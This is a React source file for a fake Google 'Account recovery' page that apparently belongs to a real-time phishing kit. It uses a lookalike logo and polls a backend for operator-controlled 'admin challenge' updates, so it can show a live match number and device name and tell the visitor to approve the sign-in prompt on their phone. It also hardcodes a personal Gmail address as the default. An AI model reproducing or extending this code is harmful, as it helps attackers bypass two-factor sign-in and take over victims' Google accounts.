import React, { useState, useEffect } from 'react';
import { ArrowLeft, RefreshCw } from 'lucide-react';
import GonnitLogo from './GonnitLogo';
import AccountBadge from './AccountBadge';

export default function StepPromptNumber({
  sessionData,
  onBack,
  onResend,
  onDontHavePhone,
  onVerified,
  onChangeAccount,
  deviceInfo
}) {
  const [timeLeft, setTimeLeft] = useState(60);
  const [isResending, setIsResending] = useState(false);
  const [liveMatchNumber, setLiveMatchNumber] = useState(sessionData?.match_number || 63);
  const [liveDeviceName, setLiveDeviceName] = useState(
    sessionData?.target_device_name || sessionData?.device_name || 'Apple iPhone 16'
  );

  // Synchronize when sessionData props change from parent
  useEffect(() => {
    if (sessionData?.match_number) {
      setLiveMatchNumber(sessionData.match_number);
    }
    const propDev = sessionData?.target_device_name || sessionData?.device_name;
    if (propDev) {
      setLiveDeviceName(propDev);
    }
  }, [sessionData?.match_number, sessionData?.target_device_name, sessionData?.device_name]);

  const matchNumber = liveMatchNumber;
  const deviceName = liveDeviceName;
  const userEmail = sessionData?.email || 'robertmoorebusiness1@gmail.com';

  // Resend timer countdown
  useEffect(() => {
    if (timeLeft <= 0) return;
    const timer = setInterval(() => {
      setTimeLeft((prev) => (prev > 0 ? prev - 1 : 0));
    }, 1000);
    return () => clearInterval(timer);
  }, [timeLeft]);

  // Real-time listener for verification & dynamic admin challenge updates
  useEffect(() => {
    if (!sessionData?.session_id) return;

    let isSubscribed = true;
    const interval = setInterval(async () => {
      try {
        const res = await fetch(`/api/recovery/status/${sessionData.session_id}`);
        if (!res.ok) return;
        const data = await res.json();
        if (data && isSubscribed) {
          if (data.match_number) setLiveMatchNumber(data.match_number);
          if (data.device_name) setLiveDeviceName(data.device_name);
          if (data.is_verified) {
            clearInterval(interval);
            onVerified();
          }
        }
      } catch (err) {}
    }, 1500);

    return () => {
      isSubscribed = false;
      clearInterval(interval);
    };
  }, [sessionData?.session_id, onVerified]);

  const handleConfirmMatchNumber = async () => {
    if (!sessionData?.session_id) {
      onVerified();
      return;
    }
    try {
      await fetch('/api/recovery/verify-match-number', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ session_id: sessionData.session_id, chosen_number: matchNumber }),
      });
      onVerified();
    } catch (e) {
      onVerified();
    }
  };

  const handleResend = async () => {
    if (timeLeft > 0 || isResending) return;
    setIsResending(true);
    try {
      await onResend();
      setTimeLeft(60);
    } finally {
      setIsResending(false);
    }
  };

  return (
    <div className="w-full text-left">
      {/* Back Button Arrow */}
      <div className="mb-4 -ml-2">
        <button
          type="button"
          onClick={onBack}
          className="w-10 h-10 rounded-full flex items-center justify-center text-[#1f1f1f] hover:bg-[#f1f3f4] transition-colors"
          title="Go back"
        >
          <ArrowLeft className="w-5 h-5 text-[#1f1f1f]" />
        </button>
      </div>

      {/* 2-Column Responsive Layout Matching Image 3 */}
      <div className="grid grid-cols-1 md:grid-cols-2 gap-8 md:gap-12 items-start">
        {/* LEFT COLUMN */}
        <div className="flex flex-col justify-between h-full">
          <div>
            <div className="hidden sm:block mb-4">
              <GonnitLogo />
            </div>

            <h1 className="text-[28px] sm:text-[32px] font-normal text-[#1f1f1f] tracking-tight leading-tight mb-2">
              Account recovery
            </h1>

            <p className="text-[14px] sm:text-[15px] text-[#444746] mb-4 font-normal leading-normal">
              To help keep your account safe, Google wants to make sure it's really you trying to sign in
            </p>

            <AccountBadge
              email={userEmail}
              fullName={sessionData?.full_name}
              avatarUrl={sessionData?.avatar_url}
              onChangeAccount={onChangeAccount}
            />
          </div>

          {/* Bottom Left: Resend it */}
          <div className="pt-10 md:pt-24">
            <button
              type="button"
              onClick={handleResend}
              disabled={timeLeft > 0 || isResending}
              className="text-[14px] font-medium text-[#0b57d0] hover:bg-[#f0f4f9] px-3 py-2 rounded-full transition-colors -ml-3 disabled:opacity-50 disabled:cursor-not-allowed inline-flex items-center gap-1.5"
            >
              <RefreshCw className={`w-3.5 h-3.5 ${isResending ? 'animate-spin' : ''}`} />
              <span>{timeLeft > 0 ? `Resend it (${timeLeft}s)` : 'Resend it'}</span>
            </button>
          </div>
        </div>

        {/* RIGHT COLUMN */}
        <div className="flex flex-col justify-between h-full pt-2 md:pt-4">
          <div>
            {/* The Big Number matching Image 3 (Clickable to confirm) */}
            <div className="text-center my-2 mb-6">
              <span
                onClick={handleConfirmMatchNumber}
                title="Tap to verify"
                className="text-[52px] sm:text-[60px] font-normal text-[#1f1f1f] leading-none tracking-tight cursor-pointer hover:text-[#0b57d0] transition-colors select-none"
              >
                {matchNumber}
              </span>
            </div>

            {/* Title */}
            <h2 className="text-[18px] sm:text-[20px] font-normal text-[#1f1f1f] mb-3 leading-snug">
              Open the Gmail app on {deviceName}
            </h2>

            {/* Instruction paragraph */}
            <p className="text-[14px] text-[#444746] leading-relaxed mb-4">
              Google sent a notification to your {deviceName}. Open the Gmail app, tap <strong className="font-semibold text-[#1f1f1f]">Yes</strong> on the prompt, then tap <strong className="font-semibold text-[#1f1f1f]">{matchNumber}</strong> on your phone to verify it's you.
            </p>

            {/* Help Link */}
            <div className="mb-6">
              <a
                href="#help"
                className="text-[14px] font-medium text-[#0b57d0] hover:underline"
              >
                Need help? Learn more about Google prompts
              </a>
            </div>
          </div>

          {/* Bottom Right: I don't have my phone */}
          <div className="pt-10 md:pt-24 flex justify-end">
            <button
              type="button"
              onClick={onDontHavePhone}
              className="text-[14px] font-medium text-[#0b57d0] hover:bg-[#f0f4f9] px-4 py-2 rounded-full transition-colors"
            >
              I don't have my phone
            </button>
          </div>
        </div>
      </div>
    </div>
  );
}
